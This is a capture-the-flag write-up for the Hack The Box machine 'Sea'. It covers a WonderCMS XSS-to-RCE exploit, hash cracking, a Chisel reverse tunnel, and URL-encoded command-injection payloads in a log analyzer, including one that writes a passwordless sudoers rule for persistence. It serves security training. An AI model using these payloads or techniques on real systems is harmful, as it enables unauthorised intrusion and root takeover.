🌊 HTB: Sea — Rooting via XSS → RCE → Password Crack → Log File Injection

Difficulty: Medium
Author: Rephrased from pk2212
Vector: CVE-2023-41425 → Password hash crack → Port forwarding → RCE via Log Analyzer

🚀 Attack Summary

    ⚡️ Initial foothold via stored XSS-to-RCE in WonderCMS (CVE-2023-41425)

    🔓 Gained reverse shell through a malicious ZIP payload upload

    🔐 Extracted and cracked a user password hash from database.js

    🔁 Used Chisel for port forwarding to access a local log analyzer on port 8080

    ⚙️ Exploited log analyzer to achieve RCE as root

    📈 Persisted root access by modifying /etc/sudoers.d/ via log injection

🔍 Recon & Enumeration

Basic service enumeration didn’t reveal much:

nmap -sC -sV -v <target-ip>

Accessing the main page on port 80, I browsed to the “How to Participate” section which linked to a contact form. SQLi testing didn’t yield results, so I pivoted to directory fuzzing using feroxbuster:

feroxbuster -u http://sea.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

Discovered /themes/bike/, which revealed a README indicating WonderCMS v3.2.0.
💥 Exploiting WonderCMS (CVE-2023-41425)

Found a solid public exploit:
🔗 insomnia-jacob/CVE-2023-41425

This exploit chain works like this:

    Launch exploit.py, which generates a malicious xss.js and serves main.zip (containing a reverse shell payload)

    Submit the xss.js link via the vulnerable contact form under the “Website” field

    Victim (admin) visits the link → triggers XSS → uploads main.zip

    Server unpacks the archive and executes rev.php, sending a reverse shell back to the attacker

Received the shell as www-data.
🧠 Looting Credentials

Inside /data/database.js, found a hashed password.

Steps:

    Cleaned out escape characters

    Identified it as a SHA-512 hash

    Cracked using hashcat with mode 1800:

hashcat -m 1800 hash.txt rockyou.txt --force

Logged in as user amay via SSH using the recovered password. Captured user.txt.
🔀 Port Forwarding to Internal Port 8080

While enumerating with LinPEAS and manual checks, identified a service on localhost:8080.

Instead of SSH tunneling, I opted to forward using Chisel for stealth and speed:

# On local machine
chisel server -p 9001 --reverse

# On target
chisel client <your-ip>:9001 R:8080:127.0.0.1:8080

Accessed http://localhost:8080 — a System Monitor panel.
🔧 RCE via Log File Analyzer

The "Analyze Log File" function accepted a parameter log_file=, which was vulnerable.

    Tested reading files:

log_file=/etc/passwd

Output was truncated, so I used URL-encoded payload with +# to see full content:

log_file=/etc/passwd+%2B%23

Then tested command injection with &&:

    log_file=/etc/passwd+%26%26id+%2B%23

✔️ Output confirmed command execution as root.
🧨 Privilege Escalation & Root Access

To persist root access, I modified sudoers:

log_file=/etc/passwd+%26%26echo+"amay+ALL=(ALL)+NOPASSWD:+ALL"+>+/etc/sudoers.d/amay+%2B%23

Confirmed success. Then escalated:

sudo -i

Captured root.txt 🏴.
✅ Box Summary
Stage	Vector
Initial Access	CVE-2023-41425 → XSS + ZIP Upload → RCE
User Privs	Password hash extraction from database.js
Privesc to Root	RCE via log analyzer → Sudoers overwrite
🎯 Final Thoughts

“Sea” was an elegant demonstration of real-world chaining:

    Stored XSS used as a file upload vector

    Local enumeration for user creds

    Abusing developer features (log file analysis) for full system compromise
